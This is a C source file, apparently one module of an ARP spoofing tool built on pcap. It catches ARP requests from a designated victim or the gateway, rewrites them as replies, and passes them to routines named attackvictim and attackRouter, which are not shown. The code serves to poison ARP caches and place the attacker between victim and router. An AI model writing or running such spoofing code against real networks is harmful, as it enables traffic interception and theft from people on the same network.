#include "myHeader.h"

int checkVictim(Pethernet_header eh, PLANINFO LanInfo);
int checkGateWay(Pethernet_header eh, PLANINFO LanInfo);

int checkARP(pcap_t* handle, const u_char* packet, PLANINFO LanInfo)
{
	PARPHEADER header;
	header = (PARPHEADER)packet;
	u_short ether_type = ntohs(header->ethernet.ether_Type);
	/* arp : 0x0806 */
	if (ether_type == 0x0806)
	{
		/* requet : 0x0001 */
		u_short OpCode = ntohs(header->arp.Opcode);
		if (OpCode == 0x0001)
		{
			if (checkVictim(&(header->ethernet), LanInfo))
			{
				header->arp.Opcode = ntohs(0x0002);
				printf("attack victim\n");
				attackvictim(handle, header, LanInfo);
			}
			else if (checkGateWay(&(header->ethernet), LanInfo))
			{
				header->arp.Opcode = ntohs(0x0002);
				printf("attack router\n");
				attackRouter(handle, header, LanInfo);
			}
		}
		return 1;
	}
	//ipHeader(packet + 14);
	//tcpHeader(packet + 34);
	return 0;
}

int checkVictim(Pethernet_header eh, PLANINFO LanInfo)
{
	int srcCheck, dstCheck;
	srcCheck = memcmp(eh->src_MAC, LanInfo->victimMAC, sizeof(u_char) * MACLEN);
	dstCheck = memcmp(eh->dst_MAC, LanInfo->myMAC, sizeof(u_char) * MACLEN);
	return (!srcCheck) && (!dstCheck);
}

int checkGateWay(Pethernet_header eh, PLANINFO LanInfo)
{
	int srcCheck, dstCheck;
	srcCheck = memcmp(eh->src_MAC, LanInfo->gatewayMAC, sizeof(u_char) * MACLEN);
	dstCheck = memcmp(eh->dst_MAC, LanInfo->myMAC, sizeof(u_char) * MACLEN);
	return (!srcCheck) && (!dstCheck);
}